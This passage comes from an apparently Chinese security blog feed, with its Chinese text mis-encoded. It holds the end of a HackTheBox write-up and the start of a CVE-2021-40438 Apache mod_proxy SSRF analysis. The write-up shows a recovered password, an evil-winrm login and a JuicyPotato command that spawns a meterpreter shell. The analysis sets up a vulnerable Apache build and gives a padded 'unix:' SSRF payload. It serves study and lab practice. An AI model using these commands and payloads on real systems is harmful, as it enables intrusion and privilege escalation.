class="variable">$zipfile</span> = <span class="variable">$backupDest</span>.Replace(<span class="string">&quot;.sql&quot;</span>,<span class="string">&quot;.7z&quot;</span>)</span><br><span class="line"><span class="variable">$execute7zip</span> = <span class="variable">$sevenzip</span>+<span class="string">&quot; a -t7z &quot;</span>+<span class="variable">$zipfile</span>+<span class="string">&quot; &quot;</span>+<span class="variable">$backupDest</span>+<span class="string">&quot; -p&quot;</span>+<span class="variable">$cred</span>.Password</span><br><span class="line"><span class="built_in">invoke-expression</span> <span class="variable">$execute7zip</span></span><br><span class="line"><span class="built_in">Remove-Item</span> <span class="variable">$backupDest</span></span><br></pre></td></tr></table></figure><p>æ‰¾åˆ°ä¸€ç»„ç³»ç»Ÿå¯†ç <code>sophie:Alltheleavesarebrown1</code>ï¼Œæ¥ç€æˆ‘ä»¬ç”¨evil-winrmè¿æ¥ä¸€ä¸‹ï¼š</p><p><a href="https://pic.imgdb.cn/item/6462a1390d2dde5777056a7b.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6462a1390d2dde5777056a7b.jpg"></a></p><p>è¿æ¥æˆåŠŸï¼Œåœ¨Usersç›®å½•ä¸‹çœ‹åˆ°flagã€‚</p><h3 id="I-prefer-mine-with-the-skins-on"><a href="#I-prefer-mine-with-the-skins-on" class="headerlink" title="I prefer mine with the skins on"></a>I prefer mine with the skins on</h3><p>æ¥ä¸‹æ¥æˆ‘ä»¬æ‰§è¡Œä¸€ä¸‹<code>whoami /all</code>ï¼š</p><p><a href="https://pic.imgdb.cn/item/6462a16b0d2dde57770580e7.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6462a16b0d2dde57770580e7.jpg"></a></p><p>å‘ç°è¯¥ç”¨æˆ·æœ‰SeAssignPrimaryTokenPrivilegeç‰¹æƒã€‚æˆ‘ä»¬çŸ¥é“ä»¤ç‰Œåˆ›å»ºè¿›ç¨‹ä½¿ç”¨çš„CreateProcessAsUserAè¿™ä¸ªAPIè¦æ±‚ç”¨æˆ·å¿…é¡»æ‹¥æœ‰SeAssignPrimaryTokenPrivilegeç‰¹æƒï¼Œå› æ­¤æ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥è¿›è¡Œä»¤ç‰Œçªƒå–ä»¥æå‡è‡³systemæƒé™ã€‚æˆ‘è¿™é‡Œä½¿ç”¨çš„å·¥å…·æ˜¯juicy potatoã€‚é¦–å…ˆä¸Šä¼ juicy potatoå’Œmsfç”Ÿæˆçš„é©¬ï¼Œä¹‹åæ‰§è¡Œä»¥ä¸‹å‘½ä»¤åå¼¹meterpreterï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd.exe /c <span class="string">&quot;JuicyPotato.exe -t u -p C:\Users\sophie\Documents\shell-1243.exe -l 1243 -c &#123;F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4&#125;&quot;</span></span><br></pre></td></tr></table></figure><p>å› ä¸ºæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯CreateProcessAsUserAè¿™ä¸ªAPIï¼Œå› æ­¤-tå‚æ•°çš„å€¼ä¸ºuï¼Œ-cå‚æ•°ä¸ºå¯¹åº”æ“ä½œç³»ç»Ÿçš„COMå¯¹è±¡çš„CLSIDï¼Œè¿™å°ä¸»æœºæ˜¯windows server 2016çš„ï¼Œå¯ä»¥é€‰æ‹©çš„å¯¹è±¡æœ‰COMXblGameSaveï¼Œå…¶CLSIDä¸º{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}ã€‚ è‡³æ­¤ï¼Œæœ€åä¸€å°ä¸»æœºçš„systemæƒé™ä¹Ÿå·²ç»æ‹¿åˆ°äº†ã€‚æ‰“å®Œï¼Œæ”¶å·¥ï¼</p><h2 id="è¯ä¹¦"><a href="#è¯ä¹¦" class="headerlink" title="è¯ä¹¦"></a>è¯ä¹¦</h2><p>æœ€åè´´ä¸€æ³¢è¯ä¹¦å§ï¼š</p><p><a href="https://pic.imgdb.cn/item/6462a9f50d2dde57770cfe53.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6462a9f50d2dde57770cfe53.jpg"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> hackthebox </tag>
            
            <tag> å†…ç½‘æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-40438 Apache mod_proxy SSRF</title>
      <link href="/2023/04/15/apacheSSRF/"/>
      <url>/2023/04/15/apacheSSRF/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ€è¿‘å¼€å§‹æ·±å…¥äº†è§£ä¸€äº›WebæœåŠ¡å™¨çš„æ¼æ´ï¼Œæ„Ÿè§‰Apache mod_proxy SSRFè¿™ä¸ªæ¼æ´è¿˜æ˜¯å¾ˆå€¼å¾—æ·±ç©¶çš„ã€‚ä¸€æ–¹é¢æ˜¯ä¸ºäº†å­¦ä¹ Apacheçš„è°ƒè¯•çŸ¥è¯†ï¼Œè¿˜æœ‰ä¸€æ–¹é¢æ˜¯æ£€éªŒä¸€ä¸‹è‡ªèº«çš„Cè¯­è¨€æ°´å¹³ã€‚</p><h2 id="Apacheè°ƒè¯•ä¹‹è·¯"><a href="#Apacheè°ƒè¯•ä¹‹è·¯" class="headerlink" title="Apacheè°ƒè¯•ä¹‹è·¯"></a>Apacheè°ƒè¯•ä¹‹è·¯</h2><p>è¿™é‡Œæˆ‘çš„è°ƒè¯•æ–¹å¼æ˜¯è¿œç¨‹è°ƒè¯•ï¼Œä¸»æœºå’Œè™šæ‹Ÿæœºä¿¡æ¯å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å®¿ä¸»æœºï¼šWindows11       (192.168.135.1)</span><br><span class="line">è™šæ‹Ÿæœºï¼šUbuntu22.04     (192.168.135.138)</span><br></pre></td></tr></table></figure><p>Apacheæ˜¯ç”¨Cç¼–å†™çš„WebæœåŠ¡å™¨ï¼Œå¾ˆéš¾åƒTomcatè¿™ç§ç”¨javaå†™çš„æœåŠ¡å™¨é‚£æ ·å¾ˆæ–¹ä¾¿åœ°è°ƒè¯•ã€‚åœ¨åˆ†æApache mod_proxy SSRFä¹‹å‰ï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦ç¼–è¯‘ã€è°ƒè¯•è¿™ä¸ªæ¼æ´æ‰€éœ€è¦çš„Apacheã€‚åœ¨è°ƒè¯•ä¹‹å‰ï¼Œé¦–å…ˆå®‰è£…ä¾èµ–ï¼ŒåŒ…æ‹¬æˆ‘ä»¬ç¼–è¯‘è½¯ä»¶æ‰€éœ€è¦çš„build-essentialï¼Œä»¥åŠè°ƒè¯•Cç¨‹åºæ‰€éœ€è¦çš„gdbï¼Œä»¥åŠApacheæ‰€ä¾èµ–çš„å‡ ä¸ªç¬¬ä¸‰æ–¹åº“ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install build-essential gdb</span><br><span class="line">sudo apt-get install --no-install-recommends libapr1-dev libaprutil1-dev libpcre3-dev</span><br></pre></td></tr></table></figure><p>åœ¨ç¼–è¯‘Apacheä¹‹å‰ï¼Œæˆ‘ä»¬è¿˜éœ€è¦å®‰è£…ARPä¾èµ–ï¼Œè¿™æ˜¯å› ä¸ºè¿™ä¸ªSSRFæ¼æ´çš„æœ‰ä¸€äº›å…³é”®çš„è¿‡ç¨‹æ˜¯åœ¨aprè¿™ä¸ªä¾èµ–é‡Œã€‚å®Œæ•´çš„APR(Apache portable Run-time librariesï¼ŒApacheå¯ç§»æ¤è¿è¡Œåº“)å®é™…ä¸ŠåŒ…å«äº†ä¸‰ä¸ªå¼€å‘åŒ…ï¼šaprã€apr-utilä»¥åŠapr-iconvï¼Œæ¯ä¸€ä¸ªå¼€å‘åŒ…åˆ†åˆ«ç‹¬ç«‹å¼€å‘ï¼Œå¹¶æ‹¥æœ‰è‡ªå·±çš„ç‰ˆæœ¬ã€‚apr-utilè¯¥ç›®å½•ä¸­ä¹Ÿæ˜¯åŒ…å«äº†ä¸€äº›å¸¸ç”¨çš„å¼€å‘ç»„ä»¶ã€‚è¿™äº›ç»„ä»¶ä¸aprç›®å½•ä¸‹çš„ç›¸æ¯”ï¼Œå®ƒä»¬ä¸apacheçš„å…³ç³»æ›´åŠ å¯†åˆ‡ä¸€äº›ã€‚æ¯”å¦‚å­˜å‚¨æ®µå’Œå­˜å‚¨æ®µç»„ï¼ŒåŠ å¯†ç­‰ç­‰ã€‚ä½†æ˜¯è¿™é‡Œæˆ‘ä»¬åªéœ€è¦aprå’Œapr-utilè¿™ä¸¤ä¸ªå®‰è£…åŒ…ã€‚</p><p>apr-utilå®‰è£…ä¾èµ–äºaprï¼Œå› æ­¤éœ€è¦é¦–å…ˆå®‰è£…apr-1.6.5ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget https://dlcdn.apache.org/apr/apr-1.6.5.tar.gz <span class="comment">#ä¸‹è½½apr-1.6.5æºç </span></span><br><span class="line">tar -zxvf apr-1.6.5.tar.gz</span><br><span class="line"><span class="built_in">cd</span> apr-1.6.5/</span><br><span class="line">CLFAGS=<span class="string">&quot;-g&quot;</span> ./configure --prefix=/home/rainb0w/workspace/apr-1.6.5/</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>å®‰è£…apr-utilï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget https://dlcdn.apache.org/apr/apr-util-1.6.3.tar.gz</span><br><span class="line">tar -zxvf apr-util-1.6.3.tar.gz</span><br><span class="line"><span class="built_in">cd</span> apr-util-1.6.3/</span><br><span class="line">CLFAGS=<span class="string">&quot;-g&quot;</span> ./configure --prefix=/home/rainb0w/workspace/apr-util-1.6.3 --with-apr=/home/rainb0w/workspace/apr-1.6.5/</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>å› ä¸ºCVE-2021-40438å·²ç»åœ¨Apache HTTP Server 2.4.49åŠæ›´é«˜ç‰ˆæœ¬ä¸­ä¿®è¡¥ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä½ç‰ˆæœ¬çš„Apacheè¿›è¡Œç¼–è¯‘ï¼Œç›´æ¥åˆ°å®˜ç½‘ä¸‹è½½ï¼š<a href="https://archive.apache.org/dist/httpd/">https://archive.apache.org/dist/httpd/</a>ï¼Œä¸‹è½½åè§£å‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://archive.apache.org/dist/httpd/httpd-2.4.43.tar.gz</span><br><span class="line">tar -zxvf httpd-2.4.43.tar.gz</span><br></pre></td></tr></table></figure><p>æˆ‘çš„ç›®å½•ä¸ºï¼š&#x2F;home&#x2F;rainb0w&#x2F;workspace&#x2F;httpd-2.4.43</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home/rainb0w/workspace/httpd-2.4.43</span><br><span class="line">CFLAGS=<span class="string">&quot;-g&quot;</span> ./configure --prefix=/home/rainb0w/workspace/httpd-2.4.43/ --with-apr=/home/rainb0w/workspace/apr-1.6.5/ --with-apr-util=/home/rainb0w/workspace/apr-util-1.6.3/</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯æˆ‘å®‰è£…ä¹‹åçš„ç›®å½•ç»“æ„ï¼š</p><p><a href="https://pic.imgdb.cn/item/642c7ddaa682492fcc209370.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642c7ddaa682492fcc209370.jpg"></a></p><p>æ ¹æ®æŠ«éœ²å‡ºçš„æ¼æ´ç»†èŠ‚å¯ä»¥å¾—çŸ¥ï¼Œè¯¥æ¼æ´æ˜¯ç”±äºmod_proxy å°†è¯·æ±‚è½¬å‘åˆ°è¿œç¨‹ç”¨æˆ·é€‰æ‹©çš„æºæœåŠ¡å™¨ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å…ˆé…ç½®ä¸€ä¸ªåå‘ä»£ç†ã€‚</p><p>é¦–å…ˆå°†proxy_moduleå’Œproxy_http_moduleè¿™ä¸¤ä¸ªæ¨¡å—å‰çš„æ³¨é‡Šå»æ‰ï¼š</p><p><a href="https://pic.imgdb.cn/item/642c7defa682492fcc20aaa3.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642c7defa682492fcc20aaa3.jpg"></a></p><p>ä¹‹åå¢åŠ ä¸€ä¸ªè™šæ‹Ÿä¸»æœºçš„é…ç½®ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;VirtualHost *&gt;</span><br><span class="line">        ServerAdmin webmaster@localhost</span><br><span class="line">        ServerName localhost</span><br><span class="line">        DocumentRoot /home/rainb0w/workspace/httpd-2.4.43/htdocs</span><br><span class="line">        LogLevel notice proxy:trace8</span><br><span class="line">        ErrorLog /home/rainb0w/workspace/httpd-2.4.43/logs/error.log</span><br><span class="line">        CustomLog /home/rainb0w/workspace/httpd-2.4.43/logs/access.log combined</span><br><span class="line">        ProxyPass / &quot;http://192.168.135.1/&quot;</span><br><span class="line">        ProxyPassReverse / &quot;http://192.168.135.1/&quot;</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåä»£çš„åœ°å€æ˜¯æˆ‘å®¿ä¸»æœºçš„ï¼Œéœ€è¦æ”¹æˆè‡ªå·±çš„ã€‚DocumentRootã€ErrorLogå’ŒCustomLogä¹Ÿéƒ½è¦æ”¹æˆè‡ªå·±çš„ï¼Œä¸ç„¶ä¼šæŠ¥é”™ã€‚ä¹‹åæˆ‘ä»¬åœ¨&#x2F;home&#x2F;rainb0w&#x2F;workspace&#x2F;httpd-2.4.43ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªç›®å½•.vscodeï¼Œåœ¨.vscodeç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œæ–‡ä»¶åä¸ºlaunch.jsonï¼Œæ–‡ä»¶å€¼å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    // Use IntelliSense to learn about possible attributes.</span><br><span class="line">    // Hover to view descriptions of existing attributes.</span><br><span class="line">    // For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387</span><br><span class="line">    &quot;version&quot;: &quot;0.2.0&quot;,</span><br><span class="line">    &quot;configurations&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;name&quot;: &quot;(gdb) Launch&quot;,</span><br><span class="line">            &quot;type&quot;: &quot;cppdbg&quot;,</span><br><span class="line">            &quot;request&quot;: &quot;launch&quot;,</span><br><span class="line">            &quot;program&quot;: &quot;/home/rainb0w/workspace/httpd-2.4.43/bin/httpd&quot;,</span><br><span class="line">            &quot;args&quot;: [&quot;-X&quot;, &quot;-DFOREGROUND&quot;],</span><br><span class="line">            &quot;stopAtEntry&quot;: false,</span><br><span class="line">            &quot;cwd&quot;: &quot;/home/rainb0w/workspace/httpd-2.4.43&quot;,</span><br><span class="line">            &quot;environment&quot;: [],</span><br><span class="line">            &quot;externalConsole&quot;: false,</span><br><span class="line">            &quot;MIMode&quot;: &quot;gdb&quot;,</span><br><span class="line">            &quot;setupCommands&quot;: [</span><br><span class="line">                &#123;</span><br><span class="line">                    &quot;description&quot;: &quot;Enable pretty-printing for gdb&quot;,</span><br><span class="line">                    &quot;text&quot;: &quot;-enable-pretty-printing&quot;,</span><br><span class="line">                    &quot;ignoreFailures&quot;: true</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>programæ˜¯éœ€è¦è°ƒåˆ¶çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œcwdæ˜¯æŒ‡ å®šè¿è¡Œæ—¶çš„ç›®å½•ï¼Œéƒ½éœ€è¦æ”¹æˆè‡ªå·±çš„ã€‚ä¹‹ååœ¨è™šæ‹Ÿæœºä¸­å®‰è£…openssh-serverï¼Œç¡®ä¿å®¿ä¸»æœºå¯ä»¥ä½¿ç”¨sshç™»é™†åˆ°rootã€‚</p><p>æ¥ç€åœ¨vscodeä¸­ï¼Œå®‰è£…Remote - SSHæ‰©å±•ï¼Œæ·»åŠ ä¸€ä¸ªè¿œç¨‹æœåŠ¡å™¨ï¼Œå¦‚ä¸‹ï¼š</p><p><a href="https://pic.imgdb.cn/item/642c7e04a682492fcc20c37f.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642c7e04a682492fcc20c37f.jpg"></a></p><p>æ¥ç€å®‰è£…è°ƒè¯•Cæ‰€éœ€è¦çš„æ‰©å±•ï¼šC&#x2F;C++ï¼ˆ<a href="https://marketplace.visualstudio.com/items?itemName=ms-vscode.cpptools">https://marketplace.visualstudio.com/items?itemName=ms-vscode.cpptools</a>ï¼‰</p><p>æœ€ååœ¨æºç ä¸­æ‰¾åˆ°éœ€è¦è°ƒè¯•çš„éƒ¨åˆ†ï¼Œæ‰“ä¸‹æ–­ç‚¹ï¼Œå³å¯è¿œç¨‹è°ƒè¯•ã€‚</p><h2 id="Apache-mod-proxy-SSRFæ¼æ´åˆ†æ"><a href="#Apache-mod-proxy-SSRFæ¼æ´åˆ†æ" class="headerlink" title="Apache mod_proxy SSRFæ¼æ´åˆ†æ"></a>Apache mod_proxy SSRFæ¼æ´åˆ†æ</h2><h3 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><p>æˆ‘æœ¬åœ°çš„ç¯å¢ƒï¼š</p><p><a href="http://192.168.135.138/%EF%BC%9A">http://192.168.135.138/ï¼š</a></p><p><a href="https://pic.imgdb.cn/item/642c7e25a682492fcc20e58d.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642c7e25a682492fcc20e58d.jpg"></a></p><p>è®¿é—®&#x2F;1.txtï¼š</p><p><a href="https://pic.imgdb.cn/item/642c7e3aa682492fcc20fbb9.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642c7e3aa682492fcc20fbb9.jpg"></a></p><p>æ¥ç€ç»™å‡ºpayloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET http://192.168.135.138/?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA